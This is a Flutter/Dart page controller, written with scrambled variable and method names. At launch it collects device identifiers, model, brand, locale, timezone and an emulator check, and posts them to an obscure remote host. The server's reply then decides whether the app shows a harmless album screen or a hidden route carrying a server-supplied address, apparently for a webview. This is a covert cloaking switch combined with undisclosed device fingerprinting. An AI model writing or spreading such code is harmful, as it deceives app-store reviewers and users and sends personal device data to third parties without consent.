import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var tgzueb = RxBool(false);
  var qgipltuojz = RxBool(true);
  var cnrj = RxString("");
  var sterling = RxBool(false);
  var franecki = RxBool(true);
  final ngtbyrzapi = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pmqokzg();
  }


  Future<void> pmqokzg() async {

    sterling.value = true;
    franecki.value = true;
    qgipltuojz.value = false;

    ngtbyrzapi.post("https://ke.eaterip.xyz/txpbcrylzmnidjeahsk",data: await bksglw()).then((value) {
      var oldteqxu = value.data["oldteqxu"] as String;
      var umtcqfge = value.data["umtcqfge"] as bool;
      if (umtcqfge) {
        cnrj.value = oldteqxu;
        oliver();
      } else {
        hane();
      }
    }).catchError((e) {
      qgipltuojz.value = true;
      franecki.value = true;
      sterling.value = false;
    });
  }

  Future<Map<String, dynamic>> bksglw() async {
    final DeviceInfoPlugin tsyiunp = DeviceInfoPlugin();
    PackageInfo phsbrdcl_kozripma = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var inuwcfpg = Platform.localeName;
    var rwliszbx = currentTimeZone;

    var dxog = phsbrdcl_kozripma.packageName;
    var aqrcf = phsbrdcl_kozripma.version;
    var ckgbzr = phsbrdcl_kozripma.buildNumber;

    var vdgbksh = phsbrdcl_kozripma.appName;
    var milesChristiansen = "";
    var patwclej = "";
    var jalynAuer = "";
    var itdmk = "";
    var simJacobson = "";

    var felanh  = "";

    var nuwldq = "";
    var ewli = false;

    if (GetPlatform.isAndroid) {
      nuwldq = "android";
      var jhtwcvdosr = await tsyiunp.androidInfo;

      itdmk = jhtwcvdosr.brand;

      patwclej  = jhtwcvdosr.model;
      felanh = jhtwcvdosr.id;

      ewli = jhtwcvdosr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      nuwldq = "ios";
      var fpkwrvuy = await tsyiunp.iosInfo;
      itdmk = fpkwrvuy.name;
      patwclej = fpkwrvuy.model;

      felanh = fpkwrvuy.identifierForVendor ?? "";
      ewli  = fpkwrvuy.isPhysicalDevice;
    }
    var res = {
      "ckgbzr": ckgbzr,
      "milesChristiansen" : milesChristiansen,
      "aqrcf": aqrcf,
      "dxog": dxog,
      "patwclej": patwclej,
      "nuwldq": nuwldq,
      "itdmk": itdmk,
      "vdgbksh": vdgbksh,
      "felanh": felanh,
      "inuwcfpg": inuwcfpg,
      "ewli": ewli,
      "rwliszbx": rwliszbx,
      "simJacobson" : simJacobson,
      "jalynAuer" : jalynAuer,

    };
    return res;
  }

  Future<void> hane() async {
    Get.offAllNamed("/album_tab");
  }

  Future<void> oliver() async {
    Get.offAllNamed("/rule_back");
  }
}
